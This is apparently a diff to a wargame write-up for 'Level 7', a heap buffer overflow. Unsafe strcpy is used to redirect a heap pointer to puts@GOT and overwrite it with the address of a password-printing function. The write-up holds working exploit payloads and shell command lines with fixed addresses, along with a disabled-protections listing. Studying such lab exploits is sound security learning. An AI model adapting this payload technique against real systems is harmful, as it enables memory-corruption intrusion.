@@ -1,7 +1,16 @@
 ## Level 7 - Heap Buffer Overflow with GOT Overwrite
-
-### Challenge Summary
 Binary allocates two 8-byte buffers on the heap and uses unsafe `strcpy()` to copy user input from argv[1] and argv[2]. By carefully overflowing the first buffer, we can corrupt the pointer to the second buffer and make it point to the GOT. Then we overwrite puts@GOT with the address of function m(), which prints the password.
+
+### Settings
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
 
 ### Vulnerability Details
 
@@ -39,15 +48,6 @@ arg1 = b'A' * 20 + struct.pack('<I', 0x8049928)  # 24 bytes total
 arg2 = b'\xf4\x84\x04\x08'                        # 4 bytes: m() address
 ```
 
-**Command:**
-```bash
-/home/user/level7/level7 $(python -c "import struct; print b'A' * 20 + struct.pack('<I', 0x8049928)") $'\xf4\x84\x04\x08'
-```
-
-Or using hex encoding:
-```bash
-/home/user/level7/level7 $(printf '%s' 'AAAAAAAAAAAAAAAAAAAA\x28\x99\x04\x08') $(printf '\xf4\x84\x04\x08')
-```
 
 ### Binary Function Analysis
 
@@ -80,12 +80,6 @@ Password buffer at 0x8049960: Level 8 password (68 bytes)
 4. **Function Pointer:** m() is never explicitly called but becomes reachable via GOT redirection
 5. **Output Format:** m() outputs "PASSWORD - TIMESTAMP\n", extract first 64 hex characters
 
-### Level 8 Password
-
-```
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-```
-
 ### Technical Notes
 
 - **ASLR:** Disabled on this system
@@ -93,3 +87,6 @@ Password buffer at 0x8049960: Level 8 password (68 bytes)
 - **Heap Corruption:** The 20-byte overflow of an 8-byte buffer corrupts heap metadata
 - **Precision:** Requires exact payload size and address to work
 - **GOT:** Global Offset Table at fixed address, can be reliably overwritten
+
+### Command:
+/home/user/level7/level7 $(python -c "import struct; print b'A' * 20 + struct.pack('<I', 0x8049928)") $'\xf4\x84\x04\x08'
